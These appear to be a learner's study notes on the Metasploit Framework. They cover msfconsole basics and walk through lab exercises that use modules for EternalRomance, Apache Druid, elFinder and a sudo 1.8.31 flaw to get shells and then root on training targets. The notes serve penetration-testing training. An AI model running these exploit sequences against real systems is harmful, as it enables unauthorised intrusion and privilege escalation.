# Using Metasploit Framework

## Metasploit Project

a) Metasploit Framework -> Free, open-source, community driven

b) Metasploit PRO -> Paid, Commercial use, enterprise oriented

### Architecture

Modules (/usr/share/metasploit-framework/modules)

Plugins (/usr/share/metasploit-framework/plugins/)

Scripts (/usr/share/metasploit-framework/scripts/)

Tools (/usr/share/metasploit-framework/tools/)



### Intro to msfconsole (free)

Launching -> `msfconsole` or `msfconsole -q` (without banner)

Modules -> prepared scripts to exploits

* Syntax -> \<type>/\<os>/\<service>/\<name>&#x20;
  * exploit/windows/ftp/scriptftp\_list
* Search -> `help search` f.e.: `search eternalromance`
* Specific search -> `search type:exploit platform:windows cve:2021 rank:excellent microsoft`
* `Module selection -> nmap -sV <IP> ->` ![](<.gitbook/assets/image (17).png>)
  * `search ms17_010 -> use 0 -> options -> info`
    * `set RHOSTS <IP>... run`

#### Example of usage

`nmap -sVC 10.129.2.141`

`msfconsole -q`

`search eternalromance`

`options`

`set RHOSTS 10.129.2.141`

`set LHOST 10.10.14.153`

`run`

find flag.txt

### Payloads

refers to a module that aids the exploit in returning a shell to the attacker

* exploit -> finds the vuln service
* payload -> establishes a foothold

#### Example of usage

`nmap -sVC 10.129.152.95`

`msfconsole -q`

`search Apache druid`

`use 0`

`options`

`set LHOST 10.10.14.153`

`set RHOSTS 10.129.152.95`

`run`

find flag.txt



## MSF Sessions



### Sessions & Jobs usage

The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

`nmap -sVC 10.129.79.219`

elFinder



Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

`msfconsole -q`

`search elfinder`

`use 3`

`set LHOST, RHOSTS`

`run`

`shell`

`whoami` -> www-data



The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

`shell`

`sudo -V` -> version 1.8.31

msf -> `sessions`

msf -> `search sudo 1.8.31`

`use 0`

`set LHOST, SESSION`

`run`

`cd root`

`cat flag.txt`



[https://www.youtube.com/watch?v=we0cYx37lMo](https://www.youtube.com/watch?v=we0cYx37lMo)
